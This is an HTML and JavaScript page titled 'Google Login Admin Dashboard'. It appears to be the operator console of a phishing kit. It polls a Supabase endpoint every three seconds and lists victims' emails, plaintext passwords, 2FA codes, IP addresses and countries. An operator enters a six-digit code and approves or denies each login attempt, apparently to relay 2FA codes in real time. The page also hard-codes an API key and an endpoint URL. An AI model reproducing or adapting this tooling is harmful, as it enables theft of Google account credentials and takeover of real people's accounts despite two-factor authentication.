<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Login Admin Dashboard</title>
    <link rel="icon" type="image/x-icon" href="google_logo_icon_169090.ico">

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Google Sans', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: #333;
            min-height: 100vh;
            padding: 20px;
        }

        .header {
            text-align: center;
            color: white;
            margin-bottom: 30px;
        }

        .header h1 {
            font-size: 2.5rem;
            margin-bottom: 10px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }

        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }

        .stat-card {
            background: white;
            padding: 20px;
            border-radius: 15px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
            text-align: center;
        }

        .stat-number {
            font-size: 2.5rem;
            font-weight: bold;
            color: #4285f4;
        }

        .stat-label {
            color: #666;
            margin-top: 5px;
        }

        .container {
            background: white;
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            max-width: 1400px;
            margin: 0 auto;
        }

        .table-container {
            overflow-x: auto;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.08);
        }

        table {
            width: 100%;
            border-collapse: collapse;
            background: white;
        }

        th {
            background: linear-gradient(135deg, #4285f4, #34a853);
            color: white;
            padding: 15px;
            text-align: left;
            font-weight: 600;
            position: sticky;
            top: 0;
            z-index: 10;
        }

        td {
            padding: 15px;
            border-bottom: 1px solid #eee;
            vertical-align: top;
        }

        tr:hover {
            background-color: #f8f9ff;
        }

        .email {
            font-weight: 600;
            color: #1a73e8;
        }

        .password {
            font-family: monospace;
            background: #f5f5f5;
            padding: 5px 8px;
            border-radius: 4px;
            font-size: 0.9em;
        }

        .status {
            padding: 5px 10px;
            border-radius: 20px;
            font-size: 0.85em;
            font-weight: 600;
            text-align: center;
        }

        .status.pending {
            background: #fff3cd;
            color: #856404;
        }

        .status.approved {
            background: #d4edda;
            color: #155724;
        }

        .status.denied {
            background: #f8d7da;
            color: #721c24;
        }

        .actions {
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
        }

        .btn {
            padding: 8px 15px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 0.85em;
            font-weight: 600;
            transition: all 0.3s ease;
        }

        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
        }

        .btn-approve {
            background: #34a853;
            color: white;
        }

        .btn-deny {
            background: #ea4335;
            color: white;
        }

        .code-input {
            width: 100px;
            padding: 5px;
            border: 1px solid #ddd;
            border-radius: 4px;
            margin-right: 5px;
        }

        .user-code {
            background: #e8f0fe;
            color: #1967d2;
            padding: 4px 8px;
            border-radius: 4px;
            font-family: monospace;
            font-weight: bold;
        }

        .refresh-btn {
            position: fixed;
            bottom: 30px;
            right: 30px;
            width: 60px;
            height: 60px;
            background: #4285f4;
            color: white;
            border: none;
            border-radius: 50%;
            cursor: pointer;
            font-size: 1.5rem;
            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
            transition: all 0.3s ease;
        }

        .refresh-btn:hover {
            transform: scale(1.1);
        }

        .loading {
            text-align: center;
            padding: 40px;
            color: #666;
        }

        .error {
            background: #f8d7da;
            color: #721c24;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
        }

        .timestamp {
            font-size: 0.8em;
            color: #666;
        }

        @media (max-width: 768px) {
            .header h1 {
                font-size: 1.8rem;
            }
            
            .stats {
                grid-template-columns: 1fr 1fr;
            }
            
            .container {
                padding: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>üîê Google Login Admin Dashboard</h1>
        <p>Real-time monitoring and approval system</p>
    </div>

    <div class="stats">
        <div class="stat-card">
            <div class="stat-number" id="totalRequests">0</div>
            <div class="stat-label">Total Requests</div>
        </div>
        <div class="stat-card">
            <div class="stat-number" id="pendingRequests">0</div>
            <div class="stat-label">Pending</div>
        </div>
        <div class="stat-card">
            <div class="stat-number" id="approvedRequests">0</div>
            <div class="stat-label">Approved</div>
        </div>
        <div class="stat-card">
            <div class="stat-number" id="deniedRequests">0</div>
            <div class="stat-label">Denied</div>
        </div>
    </div>

    <div class="container">
        <div id="error-message" class="error" style="display: none;"></div>
        
        <div id="loading" class="loading">
            <div>üîÑ Loading requests...</div>
        </div>

        <div id="table-container" class="table-container" style="display: none;">
            <table>
                <thead>
                    <tr>
                        <th>üìß Email</th>
                        <th>üîê Password</th>
                        <th>üì± 2FA Code</th>
                        <th>üìä Status</th>
                        <th>üìÑ Page</th>
                        <th>üåê IP/Country</th>
                        <th>üïí Time</th>
                        <th>üéØ Actions</th>
                    </tr>
                </thead>
                <tbody id="requestsTableBody">
                    <!-- Requests will be populated here -->
                </tbody>
            </table>
        </div>
    </div>

    <button class="refresh-btn" onclick="loadRequests()">üîÑ</button>

    <script>
        let requests = [];

        // Load requests from Edge Function API
        async function loadRequests() {
            try {
                const response = await fetch('https://nqsdardermkzppeaazbb.supabase.co/functions/v1/api-v2/requests', {
                    method: 'GET',
                    headers: {
                        'Content-Type': 'application/json',
                        'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5xc2RhcmRlcm1renBwZWFhemJiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTA5NTY1NjUsImV4cCI6MjA2NjUzMjU2NX0.1sxR4WFiuwZbfGBSr-lZCMMbRfAGwwFpZOx_bzqsvbc',
                        'apikey': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5xc2RhcmRlcm1renBwZWFhemJiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTA5NTY1NjUsImV4cCI6MjA2NjUzMjU2NX0.1sxR4WFiuwZbfGBSr-lZCMMbRfAGwwFpZOx_bzqsvbc'
                    }
                });

                if (!response.ok) {
                    throw new Error(`HTTP ${response.status}: ${response.statusText}`);
                }

                const data = await response.json();
                requests = data || [];
                updateUI();
                document.getElementById('loading').style.display = 'none';
                document.getElementById('table-container').style.display = 'block';
                document.getElementById('error-message').style.display = 'none';

            } catch (error) {
                console.error('Error loading requests:', error);
                showError('Failed to load requests: ' + error.message);
            }
        }

        // Update UI with current data
        function updateUI() {
            updateStats();
            updateTable();
        }

        // Update statistics
        function updateStats() {
            const total = requests.length;
            const pending = requests.filter(r => r.status === 'pending').length;
            const approved = requests.filter(r => r.status === 'approved').length;
            const denied = requests.filter(r => r.status === 'denied').length;

            document.getElementById('totalRequests').textContent = total;
            document.getElementById('pendingRequests').textContent = pending;
            document.getElementById('approvedRequests').textContent = approved;
            document.getElementById('deniedRequests').textContent = denied;
        }

        // Update table
        function updateTable() {
            const tbody = document.getElementById('requestsTableBody');
            tbody.innerHTML = '';

            requests.forEach(request => {
                const row = document.createElement('tr');
                
                const formatTime = (timestamp) => {
                    if (!timestamp) return 'N/A';
                    return new Date(timestamp).toLocaleString('vi-VN');
                };

                row.innerHTML = `
                    <td class="email">${request.email || 'N/A'}</td>
                    <td><span class="password">${request.password || 'N/A'}</span></td>
                    <td>${request.twofa ? `<span class="user-code">${request.twofa}</span>` : 'N/A'}</td>
                    <td><span class="status ${request.status}">${request.status?.toUpperCase() || 'PENDING'}</span></td>
                    <td>${request.page_status || 'Login'}</td>
                    <td>${request.ip || 'Unknown'}<br><small>${request.country || 'Unknown'}</small></td>
                    <td class="timestamp">${formatTime(request.created_at)}</td>
                    <td>
                        <div class="actions" id="actions-${request.id}">
                            ${request.status === 'pending' ? `
                                <input type="text" class="code-input" id="code-${request.id}" placeholder="123456" maxlength="6">
                                <button class="btn btn-approve" onclick="approveRequest(${request.id})">‚úÖ Approve</button>
                                <button class="btn btn-deny" onclick="denyRequest(${request.id})">‚ùå Deny</button>
                            ` : `
                                <span style="color: #666; font-size: 0.9em;">
                                    ${request.status === 'approved' ? '‚úÖ Approved' : '‚ùå Denied'}
                                    ${request.approved_at ? `<br><small>${formatTime(request.approved_at)}</small>` : ''}
                                </span>
                            `}
                        </div>
                    </td>
                `;
                
                tbody.appendChild(row);
            });
        }

        // Approve request
        async function approveRequest(id) {
            const codeInput = document.getElementById(`code-${id}`);
            const verificationCode = codeInput ? codeInput.value.trim() : '';

            if (!verificationCode || verificationCode.length !== 6) {
                alert('Please enter a 6-digit verification code');
                return;
            }

            try {
                const response = await fetch('https://nqsdardermkzppeaazbb.supabase.co/functions/v1/api-v2/approve', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5xc2RhcmRlcm1renBwZWFhemJiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTA5NTY1NjUsImV4cCI6MjA2NjUzMjU2NX0.1sxR4WFiuwZbfGBSr-lZCMMbRfAGwwFpZOx_bzqsvbc',
                        'apikey': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5xc2RhcmRlcm1renBwZWFhemJiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTA5NTY1NjUsImV4cCI6MjA2NjUzMjU2NX0.1sxR4WFiuwZbfGBSr-lZCMMbRfAGwwFpZOx_bzqsvbc'
                    },
                    body: JSON.stringify({
                        id: id,
                        decision: 'approved',
                        verificationCode: verificationCode
                    })
                });

                if (!response.ok) {
                    throw new Error(`HTTP ${response.status}: ${response.statusText}`);
                }

                const data = await response.json();
                console.log('Request approved:', data);
                loadRequests(); // Reload to update UI

            } catch (error) {
                console.error('Error approving request:', error);
                showError('Failed to approve request: ' + error.message);
            }
        }

        // Deny request
        async function denyRequest(id) {
            try {
                const response = await fetch('https://nqsdardermkzppeaazbb.supabase.co/functions/v1/api-v2/approve', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5xc2RhcmRlcm1renBwZWFhemJiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTA5NTY1NjUsImV4cCI6MjA2NjUzMjU2NX0.1sxR4WFiuwZbfGBSr-lZCMMbRfAGwwFpZOx_bzqsvbc',
                        'apikey': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5xc2RhcmRlcm1renBwZWFhemJiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTA5NTY1NjUsImV4cCI6MjA2NjUzMjU2NX0.1sxR4WFiuwZbfGBSr-lZCMMbRfAGwwFpZOx_bzqsvbc'
                    },
                    body: JSON.stringify({
                        id: id,
                        decision: 'denied'
                    })
                });

                if (!response.ok) {
                    throw new Error(`HTTP ${response.status}: ${response.statusText}`);
                }

                const data = await response.json();
                console.log('Request denied:', data);
                loadRequests(); // Reload to update UI

            } catch (error) {
                console.error('Error denying request:', error);
                showError('Failed to deny request: ' + error.message);
            }
        }

        // Show error message
        function showError(message) {
            const errorDiv = document.getElementById('error-message');
            errorDiv.textContent = message;
            errorDiv.style.display = 'block';
            document.getElementById('loading').style.display = 'none';
        }

        // Initialize on page load
        document.addEventListener('DOMContentLoaded', function() {
            loadRequests();
            
            // Auto-refresh every 3 seconds
            setInterval(loadRequests, 3000);
        });
    </script>
</body>
</html>
